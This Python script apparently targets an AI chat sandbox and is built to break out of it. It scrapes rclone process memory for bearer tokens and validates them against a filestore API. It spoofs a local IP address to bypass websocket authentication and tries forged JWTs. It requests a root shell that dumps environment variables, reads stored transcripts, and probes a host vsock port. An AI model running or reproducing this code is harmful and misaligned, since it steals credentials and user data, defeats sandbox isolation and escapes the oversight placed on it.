#!/usr/bin/env python3
# mediafit.py v6.4 -- TOKEN FORENSICS + WS AUTH + NEW ROOTS
import os, sys, json, time, base64, socket, struct, fcntl, subprocess, re, random

OUT = "/mnt/user-data/outputs/mediafit-report.txt"
IFACE, ALIAS = "eth0", "192.0.2.3"
FSID = "claude_chat_01B8VHAyyWMW2vFZK7KTRgZm"
CFG  = "/dev/shm/rclone-boot/config.json"
AF_VSOCK = getattr(socket, "AF_VSOCK", 40)
R = []
def w(s=""): R.append(str(s))
def flush():
    try:
        os.makedirs(os.path.dirname(OUT), exist_ok=True)
        with open(OUT, "w") as f: f.write("\n".join(R) + "\n")
    except Exception: pass
def sec(t): w(); w("="*70); w("### "+t); w("="*70); flush()
def sh(c, t=12):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, timeout=t)
        return ((p.stdout or b"")+(p.stderr or b"")).decode(errors="replace")
    except Exception as e: return "ERR:"+repr(e)
def can_bind(ip):
    try:
        t = socket.socket(); t.bind((ip, 0)); t.close(); return True
    except Exception: return False

# ---------- ws ----------
def ws_handshake(host, port, src, timeout=3.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(timeout)
        if src: s.bind((src, 0))
        s.connect((host, port))
    except Exception as e: return "ERR", None, repr(e)
    try:
        k = base64.b64encode(os.urandom(16)).decode()
        s.sendall(("GET / HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\n"
                   "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
                   "Sec-WebSocket-Version: 13\r\n\r\n" % (host, port, k)).encode())
        h = b""
        while b"\r\n\r\n" not in h and len(h) < 4096:
            c = s.recv(1024)
            if not c: break
            h += c
        st = ("OPEN" if b" 101 " in h.split(b"\r\n")[0]+b" " else
              ("CLOSED" if not h else "HTTP:"+h.split(b"\r\n")[0].decode(errors="replace")))
        return st, s, repr(h[:150])
    except Exception as e:
        try: s.close()
        except Exception: pass
        return "ERR", None, repr(e)

def ws_send(s, text):
    p = text.encode(); n = len(p); m = os.urandom(4)
    if   n < 126:   h = b"\x81"+bytes([0x80|n])
    elif n < 65536: h = b"\x81"+bytes([0x80|126])+struct.pack(">H", n)
    else:           h = b"\x81"+bytes([0x80|127])+struct.pack(">Q", n)
    s.sendall(h+m+bytes(b ^ m[i % 4] for i, b in enumerate(p)))

def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try: h = s.recv(2)
    except socket.timeout: return None, b""
    except Exception: return "close", b""
    if len(h) < 2: return "close", b""
    op, ln, mk = h[0] & 0x0F, h[1] & 0x7F, bool(h[1] & 0x80)
    try:
        if   ln == 126: ln = struct.unpack(">H", s.recv(2))[0]
        elif ln == 127: ln = struct.unpack(">Q", s.recv(8))[0]
        m = s.recv(4) if mk else b""
        d = b""
        while len(d) < ln:
            c = s.recv(ln-len(d))
            if not c: break
            d += c
        if mk and len(m) == 4: d = bytes(b ^ m[i % 4] for i, b in enumerate(d))
        return op, d
    except Exception as e: return "err", repr(e).encode()

def ws_transcript(s, label, dur=5.0):
    t0, out = time.time(), []
    while time.time()-t0 < dur:
        op, d = ws_recv(s, 1.0)
        if op is None: continue
        if op == "close": w("      [%s] << closed" % label); return out
        if op == 9: s.sendall(b"\x8a\x80\x00\x00\x00\x00"); continue
        tag = {1:"TEXT",2:"BIN",8:"CLOSE",10:"PONG"}.get(op, "OP%s" % op)
        t = d.decode(errors="replace")
        w("      [%s] << %s(%d) %s" % (label, tag, len(d), t[:600].replace("\n"," | ")))
        out.append(t)
    return out

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
JWT_NONE = b64u(b'{"alg":"none","typ":"JWT"}')+"."+b64u(b'{"sub":"mf","iat":0,"exp":9999999999}')+"."
JWT_HS   = b64u(b'{"alg":"HS256","typ":"JWT"}')+"."+b64u(b'{"sub":"mf","iat":0,"exp":9999999999}')+"."+b64u(os.urandom(32))

def auto_create(src, auth, label, cmdline="id; uname -r; echo ---ENV---; env | sort | head -40"):
    sp = {"process_id": "mf_auto", "create_req": {
        "cmd": "/bin/sh", "args": ["-c", cmdline], "env_vars": {}, "cwd": "/tmp",
        "rows": 24, "cols": 80, "timeout": 25, "memory_limit_bytes": 0,
        "clear_env": False, "uid": 0, "gid": 0, "allow_process_id_reuse": True}}
    for it in range(10):
        st, s, raw = ws_handshake("127.0.0.1", 2024, src)
        w("  [%s#%d] hs=%s %s" % (label, it, st, raw))
        if st != "OPEN":
            if s: s.close()
            return
        try:
            if auth == "jwt_none": ws_send(s, JWT_NONE); time.sleep(0.3)
            elif auth == "jwt_hs": ws_send(s, JWT_HS); time.sleep(0.3)
            elif auth == "rclone" and TOK: ws_send(s, TOK); time.sleep(0.3)
            ws_send(s, json.dumps(sp))
            fr = ws_transcript(s, label, 5.0)
        finally:
            try: s.close()
            except Exception: pass
        j = " ".join(fr)
        m = re.search(r"missing field `([A-Za-z_]+)`", j)
        if m:
            f = m.group(1)
            sp["create_req"][f] = {} if ("env" in f or "vars" in f) else ""
            w("      ++ discovered field: %s" % f); continue
        if "InfraError" in j:
            w("      !! refused: %s" % j[:220]); return
        w("      == SUCCESS for auth=%s" % auth); return

# ---------- ip ----------
SIOCSIFADDR, SIOCSIFNETMASK = 0x8916, 0x891c
def _ifr(n, ip=None):
    nm = n.encode()[:15].ljust(16, b"\x00")
    if ip is None: return nm+b"\x00"*24
    return nm+struct.pack("H2s4s8s", socket.AF_INET, b"\x00\x00", socket.inet_aton(ip), b"\x00"*8)+b"\x00"*8
def add_secondary(ifname, ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for nm in (ifname+":0", ifname):
        try:
            fcntl.ioctl(s, SIOCSIFADDR, _ifr(nm, ip))
            try: fcntl.ioctl(s, SIOCSIFNETMASK, _ifr(nm, "255.255.255.0"))
            except Exception: pass
            if can_bind(ip): return "ok via "+nm
        except OSError: pass
    return "fail"

# ---------- http ----------
TOK, SVCURL = "", "https://api.anthropic.com/v1/filestore/fs"
def fs(method, payload, tok=None, timeout=12):
    import urllib.request as ur
    rq = ur.Request(SVCURL + "/" + method, data=json.dumps(payload).encode(),
                    headers={"Content-Type": "application/json",
                             "Connect-Protocol-Version": "1",
                             "Authorization": "Bearer " + (tok or TOK)})
    try:
        with ur.urlopen(rq, timeout=timeout) as r: return r.status, r.read().decode(errors="replace")
    except ur.HTTPError as e: return e.code, e.read().decode(errors="replace")
    except Exception as e: return "ERR", repr(e)

def jwt_claims(t):
    try:
        p = t.split(".")[1]; p += "=" * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p).decode(errors="replace"))
    except Exception: return {}

def vsock_http(cid, port, method, path, body=None, ctype=None, timeout=6.0):
    try:
        s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(timeout)
        s.connect((cid, port))
        req = "%s %s HTTP/1.1\r\nHost: vsock\r\nConnection: close\r\n" % (method, path)
        if body is not None:
            req += "Content-Type: %s\r\nContent-Length: %d\r\n" % (ctype or "application/json", len(body))
        s.sendall(req.encode()+(body or b""))
        d = b""
        try:
            while len(d) < 4096:
                c = s.recv(1024)
                if not c: break
                d += c
        except socket.timeout: pass
        s.close(); return d
    except Exception as e: return repr(e).encode()

# ===================== RUN =====================
def main():
    global TOK, SVCURL
    sec("0. FACTS")
    w("kernel : " + sh("uname -a").strip())
    w("mounts (fuse/rclone):")
    w("  " + sh("grep -E 'fuse|rclone' /proc/self/mountinfo 2>/dev/null | head -12").replace("\n", "\n  "))

    sec("A. TOKEN FORENSICS")
    w("  ls -laR /dev/shm/rclone-boot:")
    w("    " + sh("ls -laR /dev/shm/rclone-boot 2>&1 | head -60").replace("\n", "\n    "))
    w("  -- small files under state_dir --")
    for root, dirs, files in os.walk("/dev/shm/rclone-boot/state"):
        for fn in files:
            fp = os.path.join(root, fn)
            try:
                sz = os.path.getsize(fp)
                if sz < 200000:
                    data = open(fp, "rb").read()
                    w("    %s (%d bytes): %r" % (fp, sz, data[:400]))
            except Exception: pass
    w("  -- rclone pids + fds --")
    rpids = []
    for p in sorted(os.listdir("/proc")):
        if not p.isdigit(): continue
        try:
            cl = open("/proc/%s/cmdline" % p, "rb").read().replace(b"\x00", b" ").decode(errors="replace")
        except Exception: continue
        if "rclone" in cl:
            rpids.append(int(p))
            w("    pid %s cmd: %s" % (p, cl[:220]))
            w("    pid %s fds: %s" % (p, sh("ls -l /proc/%s/fd 2>&1 | head -25" % p).replace("\n", " | ")[:500]))
    w("  -- grep eyJ across dirs --")
    w("    " + sh("grep -rl 'eyJ' /dev/shm /run /tmp /etc /home /opt/rclone-boot 2>/dev/null | head -20").replace("\n", "\n    "))

    cand, ctx = set(), set()
    for pid in rpids:
        try:
            maps = open("/proc/%d/maps" % pid).read().splitlines()
            fh = open("/proc/%d/mem" % pid, "rb", buffering=0)
        except Exception: continue
        total, buf = 0, b""
        for ln in maps:
            m = re.match(r"([0-9a-f]+)-([0-9a-f]+) rw", ln)
            if not m: continue
            a, b = int(m.group(1), 16), int(m.group(2), 16)
            if b-a > 32*1024*1024 or total > 192*1024*1024: continue
            try: fh.seek(a); buf += fh.read(b-a); total += b-a
            except Exception: pass
        fh.close()
        w("    pid %d scanned %d bytes" % (pid, total))
        for mm in re.finditer(rb"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}", buf):
            cand.add(mm.group(0).decode())
        for mm in re.finditer(rb"claude_chat_[A-Za-z0-9]{20,}", buf):
            lo, hi = max(0, mm.start()-6000), min(len(buf), mm.end()+6000)
            for t in re.finditer(rb"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}", buf[lo:hi]):
                ctx.add(t.group(0).decode())
    w("  candidates: all=%d near-fsid=%d" % (len(cand), len(ctx)))
    good = []
    for t in list(ctx) + list(cand):
        p = t.split(".")
        if len(p) == 3 and len(p[2]) > 86: p[2] = p[2][:86]
        t2 = ".".join(p)
        for path in ("/", "/outputs"):
            c, b = fs("listDirectory", {"path": path}, tok=t2)
            if c == 200:
                good.append((t2, path)); break
    w("  VALID tokens: %d" % len(good))
    for t2, path in good[:4]:
        cl = jwt_claims(t2)
        w("    len=%d via %s claims=%s" % (len(t2), path, json.dumps(cl)[:400]))
    if good: TOK = good[0][0]
    w("  >>> TOK=%s" % (TOK[:80] + "..." if TOK else "(none)"))

    sec("B. LOCAL FILESTORE MOUNTS (no token needed)")
    for d in ("/mnt/transcripts", "/mnt/user-data/tool_results",
              "/mnt/user-data/uploads", "/mnt/user-data/outputs"):
        w("  --- %s ---" % d)
        w("    " + sh("ls -la %s 2>&1 | head -30" % d).replace("\n", "\n    "))
    w("  --- transcript sample ---")
    w("    " + sh("find /mnt/transcripts -type f 2>/dev/null | head -5").replace("\n", "\n    "))
    w("    " + sh("f=$(find /mnt/transcripts -type f 2>/dev/null | head -1); head -c 1200 \"$f\" 2>&1").replace("\n", "\n    "))

    sec("C. WS AUTO-SCHEMA + AUTH BYPASS")
    if not can_bind(ALIAS): w("  " + add_secondary(IFACE, ALIAS))
    BY = None
    for src in (ALIAS, "127.0.0.2"):
        st, s, raw = ws_handshake("127.0.0.1", 2024, src)
        w("  probe src=%-11s -> %-8s %s" % (src, st, raw[:80]))
        if st == "OPEN" and BY is None: BY = src
        if s: s.close()
    w("  BYPASS=%s" % BY)
    if BY:
        for auth in ("none", "jwt_none", "jwt_hs", "rclone"):
            w("  ---- auth=%s ----" % auth); auto_create(BY, auth, auth)

    sec("D. FILESTORE: new roots + method enum")
    if TOK:
        for root in ("/", "/outputs", "/uploads", "/transcripts", "/tool_results"):
            c, b = fs("listDirectory", {"path": root, "filesystem_id": FSID})
            w("  listDirectory %-14s -> %-5s %s" % (root, c, b[:260]))
        for m in ("listFilesystems","getFilesystem","statFile","getFile","getMetadata",
                  "getQuota","getFileUrl","reassignFilesystem","existsFile","readFile"):
            c, b = fs(m, {"path": "/", "filesystem_id": FSID})
            w("  %-22s -> %-5s %s" % (m, c, b[:200]))
    else: w("  (no token)")

    sec("E. HOST OTLP 5005 (protobuf)")
    for label, body in (("empty", b""), ("rm_empty", b"\x0a\x00"), ("garbage", b"\xff\xff\xff")):
        for _ in (1, 2):
            d = vsock_http(2, 5005, "POST", "/v1/metrics", body, "application/x-protobuf")
            if d:
                w("  %-9s -> %s" % (label, d[:180].decode(errors="replace").replace("\r\n", " | "))); break
        else: w("  %-9s -> (no response x2)" % label)

    sec("VERDICT")
    w("  token ....... %s" % bool(TOK))
    w("  bypass ...... %s" % BY)
    flush()

try: main()
except Exception as e: w(); w("FATAL " + repr(e))
finally: flush(); print("written " + OUT)